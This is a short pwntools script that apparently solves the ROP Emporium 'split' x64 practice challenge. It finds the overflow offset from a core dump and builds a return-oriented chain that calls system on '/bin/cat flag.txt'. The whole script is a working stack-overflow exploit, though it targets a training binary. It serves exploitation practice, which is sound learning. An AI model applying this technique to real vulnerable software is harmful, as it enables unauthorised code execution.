from pwn import *

bin = '/home/kali/Downloads/ropemporium/challenge2/x64/split'

bin= ELF(bin)
context.binary = bin
context.log_level = 'info'

p= process(bin.path)
p.sendline(cyclic(400, n=8))
p.wait_for_close()
core= p.corefile

leak= core.read(core.rsp, 8)   #read from stack where ret crashed instead of reading eip/rip
offset= cyclic_find(leak, n=8)
print(f"Found offset {offset}")

system= bin.plt['system']   # 0x080483e0 (hardcoded address) could also be used
main= bin.symbols['main']   #safe return to a viable function
rdi = next(bin.search(asm('pop rdi; ret')))     # can be found with ropper -f split
str= next(bin.search(b"/bin/cat flag.txt"))     # can be found with rabin2 -z split
ret= next(bin.search(asm('; ret')))         # ret to realign the stack 
chain= flat( b'A' * offset , p64(rdi), p64(str), p64(ret),p64(system),p64(main) )

p2= process(bin.path)
p2.sendline(chain)
p2.interactive()

with open("payload", "wb") as f:
    f.write(chain)
